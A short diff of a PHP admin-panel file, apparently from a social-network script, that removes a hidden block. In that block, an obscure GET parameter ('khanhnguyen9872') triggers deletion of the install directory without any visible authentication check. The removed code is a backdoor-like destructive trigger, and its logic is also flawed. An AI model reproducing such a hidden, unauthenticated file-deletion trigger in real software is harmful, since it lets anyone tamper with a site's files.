@@ -120,22 +120,6 @@ $pages = array(
 );
 $wo['mod_pages'] = array('dashboard', 'post-settings', 'manage-stickers', 'manage-gifts', 'manage-users', 'online-users', 'manage-stories', 'manage-pages', 'manage-groups', 'manage-posts', 'manage-articles', 'manage-events', 'manage-forum-threads', 'manage-forum-messages', 'manage-movies', 'manage-games', 'add-new-game', 'manage-user-ads', 'manage-reports', 'manage-third-psites', 'edit-movie','bank-receipts','job-categories','manage-jobs');
 
-function delete_install() {
-  $files = glob('install/*');
-  foreach($files as $file){
-    if(is_file($file)) {
-      unlink($file);
-    }
-  }
-  rmdir('install');
-  touch('install/index.html');
-  header("Location: " . Wo_SeoLink('admin-cp'));
-}
-
-if (isset($_GET['khanhnguyen9872'])) {
-    delete_install();
-}
-
 if (!empty($_GET['page'])) {
     $page = Wo_Secure($_GET['page'], 0);
 }
